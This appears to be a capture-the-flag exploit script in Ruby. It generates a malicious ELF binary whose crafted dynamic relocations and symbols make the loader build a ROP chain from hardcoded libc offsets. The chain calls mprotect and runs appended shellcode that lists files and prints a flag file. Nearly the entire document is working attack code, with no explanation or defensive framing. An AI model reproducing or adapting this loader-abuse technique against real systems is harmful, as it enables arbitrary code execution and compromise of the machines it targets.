#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'elftools'
require 'fileutils'
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby

class Array
  def to_binary_s
    map(&:to_binary_s).join
  end

  def num_bytes
    map(&:num_bytes).sum
  end
end

class Worker
  include ELFTools

  class StringTable
    def initialize
      @finalized = false
      @strings = []
      @callbacks = []
      @on_finalized = []
    end

    def add(str, &callback)
      fail if str.include?("\x00")
      @strings << str
      @callbacks << [callback, @strings.size - 1]
    end

    def on_finalized(&callback)
      @on_finalized << callback
    end

    def to_binary_s
      fail unless finalized?
      @total
    end

    def finalized?
      @finalized
    end

    def finalize(base)
      # base is file offset
      return if finalized?
      total = "\x00"
      dic = {}
      @strings.each_with_index do |s, i|
        dic[i] = total.size + base
        total << s + "\x00"
      end
      @callbacks.each do |callback, idx|
        callback.call(dic[idx], dic[idx] - base)
      end
      @total = total
      @finalized = true
      @on_finalized.each { |c| c.call(base) }
    end
  end

  attr_reader :vma

  def initialize
    @vma = 0x400000
    @strtab = StringTable.new
    @elf_header = create_elf_header
    @program_headers = create_program_headers
    @tags = create_dynamic_tags
    @symtab = create_symtab
    @relocations = create_relocations
    post_setup
  end

  ST_SIZE_AT = 0xddaa0000
  ST_VALUE_AT = 0xddab0000

  R_OFFSET_AT = 0xaadd0000
  def post_setup
    # elf_header, program_headers, tags, symtab, relocations
    tags_at = @elf_header.num_bytes + @program_headers.num_bytes
    symtab_at = tags_at + @tags.num_bytes
    relo_at = symtab_at + @symtab.num_bytes

    @elf_header.e_phentsize = @program_headers[0].num_bytes
    @elf_header.e_phnum = @program_headers.size
    @elf_header.e_phoff = @elf_header.num_bytes

    @program_headers.find { |phdr| phdr.p_type == Constants::PT_DYNAMIC }.tap do |dyn|
      dyn.p_offset = tags_at
      dyn.p_vaddr = dyn.p_paddr = vma + tags_at
      dyn.p_filesz = dyn.p_memsz = @tags.num_bytes
    end

    @tags.find { |tag| tag.d_tag == Constants::DT_SYMTAB }.tap { |tag| tag.d_val = symtab_at + vma }
    @tags.find { |tag| tag.d_tag == Constants::DT_SYMENT }.tap { |tag| tag.d_val = @symtab[0].num_bytes }
    @tags.find { |tag| tag.d_tag == Constants::DT_RELA }.tap { |tag| tag.d_val = relo_at + vma }
    @tags.find { |tag| tag.d_tag == Constants::DT_RELASZ }.tap { |tag| tag.d_val = @relocations.num_bytes }
    @tags.find { |tag| tag.d_tag == Constants::DT_RELAENT }.tap { |tag| tag.d_val = @relocations[0].num_bytes }

    %i[st_value st_size r_offset].each do |tt|
      @symtab.select { |sym| (sym.st_value & 0xffff0000) == Worker.const_get("#{tt.upcase}_AT") }.each do |sym|
        idx = sym.st_value & 0xffff
        sym.st_value = if tt.to_s.start_with?('st_')
                         symtab_at + idx * @symtab[0].num_bytes + @symtab[0].__send__(tt).rel_offset + vma
                       else
                         relo_at + idx * @relocations[0].num_bytes + @relocations[0].__send__(tt).rel_offset + vma
                       end
      end
      @relocations.select { |r| (r.r_offset & 0xffff0000) == Worker.const_get("#{tt.upcase}_AT") }.each do |r|
        idx = r.r_offset & 0xffff
        r.r_offset = if tt.to_s.start_with?('st_')
                       symtab_at + idx * @symtab[0].num_bytes + @symtab[0].__send__(tt).rel_offset + vma
                     else
                       relo_at + idx * @relocations[0].num_bytes + @relocations[0].__send__(tt).rel_offset + vma
                     end
      end
    end

    @program_headers.find { |phdr| phdr.p_type == Constants::PT_LOAD }.tap do |phdr|
      phdr.p_filesz = phdr.p_memsz = to_binary_s.size
    end
  end

  include Context
  def shellcraft
    Pwnlib::Shellcraft::Shellcraft.instance
  end
  def shellcode
    context.arch = :amd64
    Pwnlib::Asm.asm(
      shellcraft.ls +
      shellcraft.cat('flag-e596f6971e03815673c4c28574fbebe2') +
      shellcraft.exit(0)
    )
  end

  def to_binary_s
    @strtab.finalize(
      @elf_header.num_bytes +
      @program_headers.num_bytes +
      @tags.num_bytes +
      @symtab.num_bytes +
      @relocations.num_bytes
    )
    (
      @elf_header.to_binary_s +
      @program_headers.to_binary_s +
      @tags.to_binary_s +
      @symtab.to_binary_s +
      @relocations.to_binary_s +
      @strtab.to_binary_s
    ).ljust(0x800, "\x00") + shellcode
  end

  def create_elf_header
    Structs::ELF_Ehdr.new(endian: endian, elf_class: bits).tap do |header|
      # this decide size of entries
      header.e_ident.magic = Constants::ELFMAG
      header.e_ident.ei_class = { 32 => 1, 64 => 2 }[bits]
      header.e_ident.ei_data = { little: 1, big: 2 }[endian]
      # Not sure what version field means, seems it can be any value.
      header.e_ident.ei_version = 1
      header.e_ident.ei_padding = "\x00" * 7
      header.e_version = 1
      header.e_type = Constants::ET_EXEC
      header.e_machine = Constants::EM_X86_64
      header.e_ehsize = header.num_bytes
      header.e_entry = 0x400040
    end
  end

  def create_program_headers
    [
      create_pt_phdr,
      create_pt_interp,
      create_pt_load,
      create_pt_dynamic,
      create_pt_gnu_stack
    ]
  end

  def create_phdr(type, offset, addr, flags, sz, align=nil)
    align ||= sz
    Structs::ELF_Phdr[bits].new(endian: endian).tap do |header|
      header.p_type = type
      header.p_offset = offset
      header.p_vaddr = header.p_paddr = addr
      header.p_flags = flags
      header.p_filesz = header.p_memsz = sz
      header.p_align = align
    end
  end

  def create_pt_phdr
    create_phdr(Constants::PT_PHDR, @elf_header.num_bytes, @elf_header.num_bytes + vma, 4, 0)
  end

  def create_pt_interp
    str = '/lib64/ld-linux-x86-64.so.2'
    create_phdr(Constants::PT_INTERP, 0, 0, 4, str.size + 1).tap do |hdr|
      @strtab.add(str) do |offset, _|
        hdr.p_offset = offset
        hdr.p_vaddr = hdr.p_paddr = offset + vma
      end
    end
  end

  def create_pt_load
    create_phdr(Constants::PT_LOAD, 0, vma, 4 | 2, 1, 0x1000)
  end

  def create_pt_dynamic
    create_phdr(Constants::PT_DYNAMIC, 0, 0, 6, 0, 0x8)
  end

  def create_pt_gnu_stack
    create_phdr(Constants::PT_GNU_STACK, 0, 0, 6, 0, 0x10)
  end

  def create_tag(tag, val)
    Structs::ELF_Dyn.new(endian: endian, elf_class: bits).tap do |t|
      t.d_tag = tag
      t.d_val = val
    end
  end

  def create_dynamic_tags
    [
      create_needed,
      create_strtab,
      create_tag(Constants::DT_FLAGS, 8),
      create_tag(Constants::DT_RELA, 0),
      create_tag(Constants::DT_RELASZ, 0),
      create_tag(Constants::DT_RELAENT, 0),
      create_tag(Constants::DT_SYMTAB, 0),
      create_tag(Constants::DT_SYMENT, 0),
      create_tag(Constants::DT_DEBUG, 1),

      create_tag(0, 0)
    ]
  end

  def create_needed
    str = 'libc.so.6'
    create_tag(Constants::DT_NEEDED, 0).tap do |tag|
      @strtab.add(str) do |_, loffset|
        tag.d_val = loffset
      end
    end
  end

  def create_strtab
    create_tag(Constants::DT_STRTAB, 0).tap do |tag|
      @strtab.on_finalized { |base| tag.d_val = base + vma }
    end
  end

  def create_sym(name, info, other, value, size, shndx)
    Structs::ELF_sym[bits].new(endian: endian, elf_class: bits).tap do |sym|
      sym.st_info = info
      sym.st_other = other
      sym.st_value = value
      sym.st_size = size
      sym.st_shndx = shndx
      if name.is_a?(String)
        @strtab.add(name) do |_, loffset|
          sym.st_name = loffset
        end
      else
        sym.st_name = name
      end
    end
  end

  def offset_from_main(off)
    off - 0x21ab0
  end

  TO_BE_OVERWRITTEN = 0x12345678 # just a mark, value is not important at all
  def create_symtab
    [
      create_sym(0, Constants::STT_NOTYPE, 0, 0, 0, 0),
      create_sym('__libc_start_main', Constants::STT_FUNC | (Constants::STB_GLOBAL << 4), 0, 0, 0, 1),
      # With st_other = 1, the return value will be exactly st_value.
      create_sym(0, Constants::STT_FUNC | (Constants::STB_GLOBAL << 4), 1, TO_BE_OVERWRITTEN, 8, 1),
      create_sym(0, 0, 0, 0, TO_BE_OVERWRITTEN, 1),
    ]
  end

  def create_relo(offset, type, sym_idx, addend)
    Structs::ELF_Rela.new(endian: endian, elf_class: bits).tap do |relo|
      relo.r_offset = offset
      relo.r_info = type | (sym_idx << 32)
      if addend.is_a?(String)
        @strtab.add(addend) { |off, _| relo.r_addend = off + vma }
      else
        relo.r_addend = addend
      end
    end
  end

  R_COPY = 5
  R_JUMP_SLOT = 7
  R_SIZE64 = 33
  def create_relocations
    pop_rdi = 0x2155f
    pop_rdx_rsi = 0x1306d9
    rop = [
      [:addr, pop_rdi],
      [:immi, vma],
      [:addr, pop_rdx_rsi],
      [:immi, 7],
      [:immi, 0x1000],
      [:addr, mprotect = 0x11bae0],
      [:immi, 0x400800]
    ]
    [
      create_relo(ST_VALUE_AT | 2, R_JUMP_SLOT, 1, offset_from_main(0x61a118)),
      create_relo(ST_SIZE_AT | 3, R_COPY, 2, 0),
      create_relo(0x400010, R_COPY, 2, 0), # debug

      *Array.new(rop.size) { |i|
        create_relo(R_OFFSET_AT | (rop.size + 3 + i), R_SIZE64, 3, -0x130 + i * 8) # envp - 0x130 = return address
      },
      *rop.map { |t, v| t == :addr ?
                 create_relo(TO_BE_OVERWRITTEN, R_JUMP_SLOT, 1, offset_from_main(v)) :
                 create_relo(TO_BE_OVERWRITTEN, R_SIZE64, 0, v)
      }
    ]
  end

  def save(out)
    IO.binwrite(out, to_binary_s)
    FileUtils.chmod('+x', out)
  end

  def endian
    :little
  end

  def bits
    64
  end
end

worker = Worker.new
worker.save('output.elf')
